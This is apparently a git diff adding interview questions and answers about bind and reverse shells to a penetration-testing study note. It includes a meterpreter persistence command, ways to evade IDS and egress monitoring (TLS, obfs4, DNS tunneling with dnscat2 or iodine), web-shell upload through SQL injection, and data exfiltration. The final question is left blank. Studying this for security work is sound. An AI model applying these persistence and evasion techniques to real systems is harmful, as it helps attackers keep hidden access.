@@ -12,5 +12,44 @@
 - The attacker connects to the target machine’s listening port.
 - Commonly `Useful when the attacker cannot set up a listener or if the target machine allows inbound connections.`
 
+---
+---
+
 # Interview QnA:
+
+## 1. Suppose you have successfully exploited a vulnerability in a web application and you now need `to establish a remote shell. The target system is behind a strict firewal` that blocks incoming connections. Which type of shell would you use, bind or reverse, and why?
+- `Reverse shell as firewall allows outbound traffic & target VM will connect back to Attcker's VM`
+
+## 2. Imagine you are testing a corporate network and you have compromised a server. You need `to maintain a persistent connection with this server`. Describe the steps you would take to set up a reverse shell that can reconnect automatically if the connection is lost.
+- You will need to set up a persistence script that will run every time the target machine starts up. `set persistence true` after setting up the payload.
+- To make the reverse shell persistent, you will need to run the persistence script `run persistence -U -i 5 -p 4444 -r <LPORT>` in the meterpreter session:
+
+> Data Exfiltration: They use modules to search for sensitive files and credentials stored on the server, copying them to their machine for analysis.
+
+## 3. You are working in a restricted environment where outgoing traffic is `heavily monitored` and only a few ports are open. How would you `configure a reverse shell to evade detection and ensure the shell remains undetected`?
+- `Choose commonly allowed ports` (e.g., 80 for HTTP, 443 for HTTPS) to send reverse shell traffic.
+- `Encrypt the traffic using SSL/TLS` (e.g., with tools like OpenSSL) to make it appear as regular HTTPS traffic
+- `Use tools like obfsproxy or obfs4 to obfuscate the traffic`, making it look like legitimate HTTP or other benign traffic.
+- `Utilize DNS tunneling techniques` such as dnscat2 or iodine to encapsulate the reverse shell traffic within DNS requests,
+
+## 4. During a penetration test, you find that the `target system has a bind shell running on a non-standard port`. Explain how you would connect to this bind shell from your machine. `What tools would you use?`
+- Netcat (nc): Netcat is a versatile networking utility that can create TCP or UDP connections to specified ports.
+- Telnet: Telnet can be used if the bind shell supports plaintext communication and doesn't require encryption.
+
+## 5. Suppose you're unable to establish a direct connection via a bind or reverse shell due to strict network policies. What `alternative methods or tools could you use to achieve remote access` to the target system?
+- XSS, CSRF, or other browser vulnerabilities to execute code on target systems.
+- Exploit a known vulnerability in the web application (e.g., SQL injection) to upload a PHP web shell.
+
+## 6. You have a reverse shell running on a compromised system, and you need `to transfer a large file from your local machine to the target system. Explain how you would accomplish this securely and efficiently.`
+- Compress the file using `gzip/zip` and transfer using `SCP or SFTP` 
+
+## 7. While performing a penetration test, you find that the target system is using an Intrusion Detection System (IDS) that can detect common shell connections. How would you `obfuscate your reverse shell traffic to avoid detection by the IDS?`
+- `Encrypting your reverse shell traffic` prevents the IDS from inspecting and understanding the payload.
+- `Use HTTPS/TLS` as it makes your traffic appear as legitimate web traffic, often bypassing IDS rules that focus on typical shell connections.
+
+## 8. 
+
+
+
+
 
